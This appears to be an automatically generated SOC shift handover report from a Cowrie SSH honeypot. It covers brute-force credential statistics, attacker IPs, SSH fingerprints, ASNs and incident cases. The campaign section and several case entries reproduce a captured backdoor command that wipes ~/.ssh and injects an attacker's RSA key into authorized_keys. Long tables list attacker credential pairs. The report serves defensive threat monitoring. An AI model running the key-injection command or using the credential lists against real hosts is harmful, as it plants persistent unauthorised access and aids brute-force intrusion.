# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-30 |
| **Generated At** | 2026-06-30T08:00:21Z |
| **Shift Time** | 08:00 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **399** |
| Confirmed Threats | **387** |
| False Positives Filtered | **12** (3.0%) |
| Unique Attacker IPs | **86** |
| Countries of Origin | **19** |
| High Severity Cases | **161** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **238** |
| Malware Samples Analyzed | **5** HIGH · **40** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **266** |
| Unique Credential Pairs | **142** |
| Unique Usernames | **36** |
| Unique Passwords | **119** |
| Successful Auth Pairs | **189** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 131 |
| `345gs5662d34` | 52 |
| `admin` | 9 |
| `ubuntu` | 8 |
| `lghkel	` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 52 |
| `3245gs5662d34` | 52 |
| `zpz}ld	` | 8 |
| `LeitboGi0ro` | 8 |
| `admin` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 52 |
| `root` | `3245gs5662d34` | 35 |
| `lghkel	` | `zpz}ld	` | 8 |
| `root` | `LeitboGi0ro` | 8 |
| `admin` | `admin` | 6 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `q1w2e3r4t5y` | `45.205.1.42` | 2026-06-30T02:55:35 |
| `jenkins` | `root` | `10.0.0.73` | 2026-06-30T02:56:35 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-06-30T02:56:38 |
| `jenkins` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T02:56:38 |
| `root` | `1qaz!QAZ1` | `177.212.152.123` | 2026-06-30T02:59:02 |
| `345gs5662d34` | `345gs5662d34` | `177.212.152.123` | 2026-06-30T02:59:05 |
| `root` | `3245gs5662d34` | `177.212.152.123` | 2026-06-30T02:59:06 |
| `quality` | `quality123` | `213.230.111.14` | 2026-06-30T02:59:48 |
| `vod` | `vod` | `103.20.223.56` | 2026-06-30T03:00:04 |
| `345gs5662d34` | `345gs5662d34` | `103.20.223.56` | 2026-06-30T03:00:08 |
| `vod` | `3245gs5662d34` | `103.20.223.56` | 2026-06-30T03:00:10 |
| `345gs5662d34` | `345gs5662d34` | `213.230.111.14` | 2026-06-30T03:00:17 |
| `quality` | `3245gs5662d34` | `213.230.111.14` | 2026-06-30T03:00:19 |
| `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `b'\xda\xdb\xd8\xdf\xcb\xd2\xca'` | `131.241.3.85` | 2026-06-30T03:01:05 |
| `lghkel	` | `zpz}ld	` | `131.241.3.85` | 2026-06-30T03:01:05 |
| `guest` | `guest` | `131.241.3.85` | 2026-06-30T03:01:38 |
| `b'\xcc\xd1\xd1\xca'` | `b'\x8c\x8e\x8e\x86\x8e\x86\x8c\x88'` | `131.241.3.85` | 2026-06-30T03:02:33 |
| `root` | `zlxx` | `131.241.3.85` | 2026-06-30T03:03:08 |
| `arts` | `arts123` | `115.190.255.67` | 2026-06-30T03:03:33 |
| `root` | `joshua` | `45.198.224.120` | 2026-06-30T03:06:49 |
| `root` | `admin` | `158.101.161.27` | 2026-06-30T03:08:26 |
| `guest` | `guest1234` | `45.205.1.42` | 2026-06-30T03:10:35 |
| `abc` | `123456` | `177.11.196.79` | 2026-06-30T03:11:19 |
| `345gs5662d34` | `345gs5662d34` | `177.11.196.79` | 2026-06-30T03:11:22 |
| `abc` | `3245gs5662d34` | `177.11.196.79` | 2026-06-30T03:11:23 |
| `root` | `qwertys` | `45.198.224.120` | 2026-06-30T03:19:22 |
| `root` | `Paic1234` | `45.205.1.42` | 2026-06-30T03:25:24 |
| `user` | `User` | `69.164.192.53` | 2026-06-30T03:26:25 |
| `345gs5662d34` | `345gs5662d34` | `69.164.192.53` | 2026-06-30T03:26:27 |
| `user` | `3245gs5662d34` | `69.164.192.53` | 2026-06-30T03:26:27 |
| `root` | `adminisp` | `185.242.3.195` | 2026-06-30T03:28:06 |
| `root` | `admin2024#` | `147.15.20.173` | 2026-06-30T03:28:28 |
| `345gs5662d34` | `345gs5662d34` | `147.15.20.173` | 2026-06-30T03:28:32 |
| `root` | `3245gs5662d34` | `147.15.20.173` | 2026-06-30T03:28:33 |
| `root` | `Root1!` | `49.238.167.125` | 2026-06-30T03:31:00 |
| `345gs5662d34` | `345gs5662d34` | `49.238.167.125` | 2026-06-30T03:31:04 |
| `root` | `3245gs5662d34` | `49.238.167.125` | 2026-06-30T03:31:05 |
| `root` | `Pa$$w0rd!` | `45.198.224.120` | 2026-06-30T03:31:42 |
| `webdev` | `webdev` | `201.16.238.49` | 2026-06-30T03:32:05 |
| `345gs5662d34` | `345gs5662d34` | `201.16.238.49` | 2026-06-30T03:32:07 |
| `webdev` | `3245gs5662d34` | `201.16.238.49` | 2026-06-30T03:32:08 |
| `root` | `myserver` | `36.111.40.138` | 2026-06-30T03:33:40 |
| `345gs5662d34` | `345gs5662d34` | `36.111.40.138` | 2026-06-30T03:33:44 |
| `root` | `3245gs5662d34` | `36.111.40.138` | 2026-06-30T03:33:45 |
| `root` | `qazwsxroot` | `45.205.1.42` | 2026-06-30T03:40:12 |
| `root` | `Password12` | `45.198.224.120` | 2026-06-30T03:43:42 |
| `root` | `sairam` | `10.0.0.73` | 2026-06-30T03:44:04 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T03:44:06 |
| `analog` | `123456` | `45.207.8.63` | 2026-06-30T03:44:43 |
| `345gs5662d34` | `345gs5662d34` | `45.207.8.63` | 2026-06-30T03:44:47 |
| `analog` | `3245gs5662d34` | `45.207.8.63` | 2026-06-30T03:44:48 |
| `root` | `root8888` | `10.0.0.73` | 2026-06-30T03:46:49 |
| `admin` | `admin` | `43.110.38.5` | 2026-06-30T03:48:02 |
| `admin` | `admin` | `130.12.180.51` | 2026-06-30T03:48:04 |
| `root` | `ubuntu` | `36.189.207.209` | 2026-06-30T03:48:33 |
| `hpc` | `123456` | `223.109.141.9` | 2026-06-30T03:48:37 |
| `345gs5662d34` | `345gs5662d34` | `223.109.141.9` | 2026-06-30T03:48:41 |
| `hpc` | `3245gs5662d34` | `223.109.141.9` | 2026-06-30T03:48:43 |
| `root` | `qy123456!` | `10.0.0.73` | 2026-06-30T03:49:51 |
| `root` | `Qz123456` | `10.0.0.73` | 2026-06-30T03:52:01 |
| `root` | `19881988` | `10.0.0.73` | 2026-06-30T03:53:11 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-06-30T03:53:49 |
| `root` | `123@@@` | `64.110.90.250` | 2026-06-30T03:53:49 |
| `ubuntu` | `user1234` | `45.205.1.42` | 2026-06-30T03:55:16 |
| `root` | `123@@@` | `129.153.145.135` | 2026-06-30T03:55:28 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-06-30T03:55:28 |
| `acs` | `acs` | `14.103.64.177` | 2026-06-30T03:55:36 |
| `root` | `asdfgh` | `45.198.224.120` | 2026-06-30T03:55:50 |
| `root` | `David123` | `10.0.0.73` | 2026-06-30T03:59:47 |
| `acs` | `acs` | `157.10.160.213` | 2026-06-30T04:00:22 |
| `345gs5662d34` | `345gs5662d34` | `157.10.160.213` | 2026-06-30T04:00:27 |
| `acs` | `3245gs5662d34` | `157.10.160.213` | 2026-06-30T04:00:28 |
| `root` | `qazWSX123!@#` | `203.88.119.100` | 2026-06-30T04:03:00 |
| `345gs5662d34` | `345gs5662d34` | `203.88.119.100` | 2026-06-30T04:03:03 |
| `root` | `3245gs5662d34` | `203.88.119.100` | 2026-06-30T04:03:03 |
| `adm` | `adm123` | `45.198.224.120` | 2026-06-30T04:08:04 |
| `root` | `adminisp` | `10.0.0.73` | 2026-06-30T04:08:16 |
| `ubuntu` | `PASSWD` | `45.205.1.42` | 2026-06-30T04:10:20 |
| `root` | `h3tzner!` | `139.99.74.35` | 2026-06-30T04:11:15 |
| `root` | `rootpass` | `139.99.74.35` | 2026-06-30T04:12:17 |
| `root` | `1q2w3e@#` | `193.233.48.169` | 2026-06-30T04:12:20 |
| `345gs5662d34` | `345gs5662d34` | `193.233.48.169` | 2026-06-30T04:12:23 |
| `root` | `3245gs5662d34` | `193.233.48.169` | 2026-06-30T04:12:24 |
| `root` | `abc@ABC@123` | `173.244.60.241` | 2026-06-30T04:12:51 |
| `345gs5662d34` | `345gs5662d34` | `173.244.60.241` | 2026-06-30T04:12:53 |
| `root` | `3245gs5662d34` | `173.244.60.241` | 2026-06-30T04:12:53 |
| `root` | `lzwl111` | `171.25.158.80` | 2026-06-30T04:13:13 |
| `345gs5662d34` | `345gs5662d34` | `171.25.158.80` | 2026-06-30T04:13:16 |
| `root` | `3245gs5662d34` | `171.25.158.80` | 2026-06-30T04:13:16 |
| `root` | `debian` | `139.99.74.35` | 2026-06-30T04:13:23 |
| `root` | `postgres` | `139.99.74.35` | 2026-06-30T04:14:07 |
| `root` | `instance` | `139.99.74.35` | 2026-06-30T04:14:50 |
| `root` | `P@ssw0rd` | `139.99.74.35` | 2026-06-30T04:15:25 |
| `root` | `123` | `139.99.74.35` | 2026-06-30T04:16:16 |
| `root` | `root%` | `139.99.74.35` | 2026-06-30T04:17:35 |
| `ghost` | `ghost123` | `14.103.120.130` | 2026-06-30T04:18:06 |
| `345gs5662d34` | `345gs5662d34` | `14.103.120.130` | 2026-06-30T04:18:10 |
| `ghost` | `3245gs5662d34` | `14.103.120.130` | 2026-06-30T04:18:12 |
| `admin` | `letmein` | `139.99.74.35` | 2026-06-30T04:19:38 |
| `root` | `daniel` | `45.198.224.120` | 2026-06-30T04:20:25 |
| `admin` | `zxcvbnm123` | `139.99.74.35` | 2026-06-30T04:21:21 |
| `admin` | `admin1234` | `139.99.74.35` | 2026-06-30T04:22:42 |
| `root` | `123456MM` | `10.0.0.73` | 2026-06-30T04:22:44 |
| `confluence` | `confluence` | `45.205.1.42` | 2026-06-30T04:25:27 |
| `postgres` | `11111111` | `10.0.0.73` | 2026-06-30T04:26:14 |
| `root` | `QQQaaa123` | `10.0.0.73` | 2026-06-30T04:26:17 |
| `postgres` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T04:26:19 |
| `administrator` | `admin@123` | `10.0.0.73` | 2026-06-30T04:30:03 |
| `administrator` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T04:30:09 |
| `bitrix` | `qwe123` | `10.0.0.73` | 2026-06-30T04:30:35 |
| `bitrix` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T04:30:37 |
| `root` | `zaq123` | `45.198.224.120` | 2026-06-30T04:32:42 |
| `ubuntu` | `hadoop123` | `45.205.1.42` | 2026-06-30T04:40:36 |
| `ubuntu` | `ubuntu123!@#` | `45.198.224.120` | 2026-06-30T04:44:34 |
| `root` | `L1nux@Passw0rd!` | `45.148.10.239` | 2026-06-30T04:44:43 |
| `root` | `qazzaq224466` | `45.205.1.42` | 2026-06-30T04:55:39 |
| `ubuntu` | `abc123456789` | `45.198.224.120` | 2026-06-30T04:56:43 |
| `wangxin5` | `wangxin5` | `185.242.3.195` | 2026-06-30T04:59:19 |
| `root` | `xh123456` | `10.0.0.73` | 2026-06-30T05:07:57 |
| `root` | `loldongs` | `10.0.0.73` | 2026-06-30T05:08:00 |
| `root` | `aA.123456` | `10.0.0.73` | 2026-06-30T05:08:14 |
| `root` | `myspace1` | `45.198.224.120` | 2026-06-30T05:09:32 |
| `testserver` | `123` | `10.0.0.73` | 2026-06-30T05:09:51 |
| `nagios` | `666666` | `45.205.1.42` | 2026-06-30T05:10:42 |
| `root` | `Server2024#` | `10.0.0.73` | 2026-06-30T05:11:12 |
| `postgres` | `postgres` | `10.0.0.73` | 2026-06-30T05:11:25 |
| `root` | `qwertz12345` | `45.198.224.120` | 2026-06-30T05:22:38 |
| `jack` | `123456` | `45.205.1.42` | 2026-06-30T05:25:57 |
| `root` | `mohamed123` | `41.218.110.114` | 2026-06-30T05:33:10 |
| `345gs5662d34` | `345gs5662d34` | `41.218.110.114` | 2026-06-30T05:33:14 |
| `root` | `3245gs5662d34` | `41.218.110.114` | 2026-06-30T05:33:15 |
| `jinlinfang` | `jinlinfang` | `45.198.224.120` | 2026-06-30T05:35:35 |
| `wangxin5` | `wangxin5` | `10.0.0.73` | 2026-06-30T05:39:10 |
| `root` | `7777777` | `45.205.1.42` | 2026-06-30T05:41:24 |
| `root` | `qinaide520` | `45.198.224.120` | 2026-06-30T05:48:32 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-06-30T05:49:27 |
| `root` | `LeitboGi0ro` | `168.110.102.254` | 2026-06-30T05:52:10 |
| `root` | `123@@@` | `168.110.102.254` | 2026-06-30T05:52:11 |
| `root` | `P@ssw0rd2024!` | `54.37.229.48` | 2026-06-30T05:52:12 |
| `345gs5662d34` | `345gs5662d34` | `54.37.229.48` | 2026-06-30T05:52:14 |
| `root` | `3245gs5662d34` | `54.37.229.48` | 2026-06-30T05:52:15 |
| `elastic` | `1qaz@WSX` | `10.0.0.73` | 2026-06-30T05:55:53 |
| `elastic` | `3245gs5662d34` | `10.0.0.73` | 2026-06-30T05:55:58 |
| `ubuntu` | `1qaz@wsx` | `45.205.1.42` | 2026-06-30T05:56:45 |
| `root` | `qwerty777` | `10.0.0.73` | 2026-06-30T05:58:07 |
| `root` | `passwd1234` | `103.164.9.74` | 2026-06-30T05:58:46 |
| `345gs5662d34` | `345gs5662d34` | `103.164.9.74` | 2026-06-30T05:58:50 |
| `root` | `3245gs5662d34` | `103.164.9.74` | 2026-06-30T05:58:51 |
| `root` | `2315` | `10.0.0.73` | 2026-06-30T05:59:09 |
| `root` | `8888` | `10.0.0.73` | 2026-06-30T05:59:57 |
| `root` | `!qwer1234` | `10.0.0.73` | 2026-06-30T06:00:02 |
| `root` | `qwerty0` | `45.198.224.120` | 2026-06-30T06:01:24 |
| `root` | `root@1` | `10.0.0.73` | 2026-06-30T06:01:48 |
| `root` | `Nj@123456` | `102.54.246.130` | 2026-06-30T06:01:56 |
| `345gs5662d34` | `345gs5662d34` | `102.54.246.130` | 2026-06-30T06:01:58 |
| `root` | `3245gs5662d34` | `102.54.246.130` | 2026-06-30T06:01:59 |
| `root` | `axente` | `10.0.0.73` | 2026-06-30T06:02:24 |
| `root` | `santa` | `10.0.0.73` | 2026-06-30T06:05:26 |
| `root` | `Root.123` | `10.0.0.73` | 2026-06-30T06:06:22 |
| `root` | `1zqa2xws` | `10.0.0.73` | 2026-06-30T06:06:26 |
| `admin` | `admin` | `218.203.249.149` | 2026-06-30T06:07:23 |
| `root` | `zxcvbnjuiop` | `10.0.0.73` | 2026-06-30T06:08:40 |
| `root` | `Digital@2024` | `10.0.0.73` | 2026-06-30T06:09:44 |
| `test` | `112233` | `45.205.1.42` | 2026-06-30T06:12:30 |
| `root` | `q123456789` | `45.198.224.120` | 2026-06-30T06:13:52 |
| `appraisal` | `appraisal` | `59.152.168.184` | 2026-06-30T06:20:41 |
| `345gs5662d34` | `345gs5662d34` | `59.152.168.184` | 2026-06-30T06:20:45 |
| `appraisal` | `3245gs5662d34` | `59.152.168.184` | 2026-06-30T06:20:46 |
| `shell` | `shell` | `45.198.224.120` | 2026-06-30T06:26:20 |
| `admin` | `admin` | `192.142.52.45` | 2026-06-30T06:26:51 |
| `root` | `q1w2e3%%` | `45.205.1.42` | 2026-06-30T06:27:59 |
| `lghkel	` | `zpz}ld	` | `112.185.230.208` | 2026-06-30T06:28:31 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\xdf\xda\xd3\xd7\xd0'` | `112.185.230.208` | 2026-06-30T06:29:05 |
| `user` | `user` | `112.185.230.208` | 2026-06-30T06:29:39 |
| `root` | `qazwsx741` | `185.242.3.195` | 2026-06-30T06:30:00 |
| `"??$` | `#?<?;5)` | `112.185.230.208` | 2026-06-30T06:30:13 |
| `root` | `zlxx` | `112.185.230.208` | 2026-06-30T06:30:48 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\x8f\x8f\x8f\x8f'` | `112.185.230.208` | 2026-06-30T06:31:22 |
| `b'\x8f\x8c\x8d'` | `b'\x8f\x8c\x8d'` | `112.185.230.208` | 2026-06-30T06:31:56 |
| `b'\xcc\xd1\xd1\xca'` | `b'\x8b\xcb\xce'` | `112.185.230.208` | 2026-06-30T06:32:30 |
| `root` | `klv123` | `112.185.230.208` | 2026-06-30T06:33:04 |
| `root` | `xc3511` | `112.185.230.208` | 2026-06-30T06:33:38 |
| `root` | `1234567` | `167.233.84.171` | 2026-06-30T06:35:33 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-06-30T06:37:38 |
| `root` | `123@@@` | `144.22.238.238` | 2026-06-30T06:37:38 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-06-30T06:37:39 |
| `root` | `Plm54321` | `45.198.224.120` | 2026-06-30T06:39:12 |
| `root` | `asdqwe` | `45.205.1.42` | 2026-06-30T06:43:29 |
| `ubuntu` | `ubuntu12345` | `45.198.224.120` | 2026-06-30T06:51:42 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **399** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 91 |
| Go SSH scanner | 61 |
| Paramiko (Python) | 17 |
| OpenSSH | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 67 | 25 |
| `16443846184e...` | Generic scanner | 54 | 6 |
| `a2de0f306611...` | Mirai/variant | 13 | 3 |
| `6372ee695756...` | Modern SSH client | 4 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 67 | 25 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 54 | 6 | Generic scanner |
| `95420f9d932d...` | libssh | 16 | 8 | — |
| `a2de0f306611...` | Paramiko (Python) | 13 | 3 | Mirai/variant |
| `6372ee695756...` | Paramiko (Python) | 4 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `19532158b559...` | libssh | 3 | 3 | Mirai/variant |
| `5f904648ee89...` | Go SSH scanner | 3 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **7** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 23 | 23 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.207.8.63`, `14.103.64.177`, `103.164.9.74`, `147.15.20.173`, `223.109.141.9`, `49.238.167.125`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **86** |
| Unique ASNs | **53** |
| High-Risk ASNs | **50** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS31898` | Oracle Corporation | 6 | HIGH |
| `AS51396` | Pfcloud UG | 6 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
| `AS4811` | China Telecom (Group) | 5 | HIGH |
| `AS6939` | Hurricane Electric LLC | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS396982` | Google LLC | 3 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (161)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1f6e93de07f1

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 02:55 |
| **Last Seen** | 2026-06-30 02:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 02:55:33` | `cowrie.session.connect` |
| `2026-06-30 02:55:33` | `cowrie.client.version` |
| `2026-06-30 02:55:33` | `cowrie.client.kex` |
| `2026-06-30 02:55:35` | `cowrie.login.success` |
| `2026-06-30 02:55:37` | `cowrie.session.params` |
| `2026-06-30 02:55:37` | `cowrie.command.input` |
| `2026-06-30 02:55:37` | `cowrie.log.closed` |
| `2026-06-30 02:55:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-489c5c3f9a59

| Field | Detail |
|---|---|
| **Source IP** | `177.212.152[.]123` |
| **First Seen** | 2026-06-30 02:59 |
| **Last Seen** | 2026-06-30 02:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 02:59:01` | `cowrie.session.connect` |
| `2026-06-30 02:59:01` | `cowrie.client.version` |
| `2026-06-30 02:59:01` | `cowrie.client.kex` |
| `2026-06-30 02:59:02` | `cowrie.login.success` |
| `2026-06-30 02:59:03` | `cowrie.session.params` |
| `2026-06-30 02:59:03` | `cowrie.command.input` |
| `2026-06-30 02:59:03` | `cowrie.command.failed` |
| `2026-06-30 02:59:03` | `cowrie.log.closed` |
| `2026-06-30 02:59:04` | `cowrie.session.params` |
| `2026-06-30 02:59:04` | `cowrie.command.input` |
| `2026-06-30 02:59:04` | `cowrie.session.file_download` |
| `2026-06-30 02:59:04` | `cowrie.log.closed` |
| `2026-06-30 02:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.212.152[.]123` to AbuseIPDB if not already reported
- [ ] Block `177.212.152[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64650294940c

| Field | Detail |
|---|---|
| **Source IP** | `177.212.152[.]123` |
| **First Seen** | 2026-06-30 02:59 |
| **Last Seen** | 2026-06-30 02:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 02:59:04` | `cowrie.session.connect` |
| `2026-06-30 02:59:04` | `cowrie.client.version` |
| `2026-06-30 02:59:04` | `cowrie.client.kex` |
| `2026-06-30 02:59:05` | `cowrie.login.success` |
| `2026-06-30 02:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.212.152[.]123` to AbuseIPDB if not already reported
- [ ] Block `177.212.152[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40a9d6410926

| Field | Detail |
|---|---|
| **Source IP** | `177.212.152[.]123` |
| **First Seen** | 2026-06-30 02:59 |
| **Last Seen** | 2026-06-30 02:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 02:59:05` | `cowrie.session.connect` |
| `2026-06-30 02:59:05` | `cowrie.client.version` |
| `2026-06-30 02:59:06` | `cowrie.client.kex` |
| `2026-06-30 02:59:06` | `cowrie.login.success` |
| `2026-06-30 02:59:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.212.152[.]123` to AbuseIPDB if not already reported
- [ ] Block `177.212.152[.]123` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca7813fc6d6e

| Field | Detail |
|---|---|
| **Source IP** | `213.230.111[.]14` |
| **First Seen** | 2026-06-30 02:59 |
| **Last Seen** | 2026-06-30 03:04 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 02:59:47` | `cowrie.session.connect` |
| `2026-06-30 02:59:47` | `cowrie.client.version` |
| `2026-06-30 02:59:47` | `cowrie.client.kex` |
| `2026-06-30 02:59:48` | `cowrie.login.success` |
| `2026-06-30 03:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.111[.]14` to AbuseIPDB if not already reported
- [ ] Block `213.230.111[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2bb39e85211

| Field | Detail |
|---|---|
| **Source IP** | `103.20.223[.]56` |
| **First Seen** | 2026-06-30 03:00 |
| **Last Seen** | 2026-06-30 03:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 03:00:03` | `cowrie.session.connect` |
| `2026-06-30 03:00:03` | `cowrie.client.version` |
| `2026-06-30 03:00:03` | `cowrie.client.kex` |
| `2026-06-30 03:00:04` | `cowrie.login.success` |
| `2026-06-30 03:00:06` | `cowrie.session.params` |
| `2026-06-30 03:00:06` | `cowrie.command.input` |
